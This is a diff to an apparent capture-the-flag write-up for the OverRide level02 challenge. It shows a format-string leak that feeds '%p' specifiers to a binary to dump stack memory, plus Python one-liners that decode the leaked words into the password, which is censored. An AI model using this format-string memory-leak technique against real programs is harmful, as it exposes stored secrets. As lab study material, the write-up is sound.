@@ -32,7 +32,7 @@ level02@OverRide:~$ ./level02 < <(python -c 'print "%p|"*30')
 0x7fffffffe4d0|(nil)|(nil)|0x2a2a2a2a2a2a2a2a|0x2a2a2a2a2a2a2a2a|0x7fffffffe6c8|0x1f7ff9a08|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|(nil)|0x100000000|(nil)|0x756e505234376848|0x45414a3561733951|0x377a7143574e6758|0x354a35686e475873|0x48336750664b394d|(nil)|0x70257c70257c7025|0x257c70257c70257c|0x7c70257c70257c70| does not have access!
 ```
 
-We can see that it's the 28th parameter to printf, more interesting looking at the posiiton of the variables in the stack, the password buffer should come right before it.
+We can see that it's the 28th parameter to printf, more interesting looking at the position of the variables in the stack, the password buffer should come right before it.
 The trailing 0 confirms our suspicions.
 
 Let's convert these blocks to ascii, while keeping in mind to account for the endianness
@@ -43,5 +43,8 @@ Let's convert these blocks to ascii, while keeping in mind to account for the en
 ```shell
 level02@OverRide:~$ python -c 'print "".join([i.decode("hex")[::-1] for i in "756e505234376848|45414a3561733951|377a7143574e6758|354a35686e475873|48336750664b394d".split("|")])'
 [censored]
+
+python -c 'import struct;print "".join([struct.pack("<Q", x) for x in [0x756e505234376848, 0x45414a3561733951, 0x377a7143574e6758, 0x354a35686e475873, 0x48336750664b394d]])'
+
 ```
 Nice!
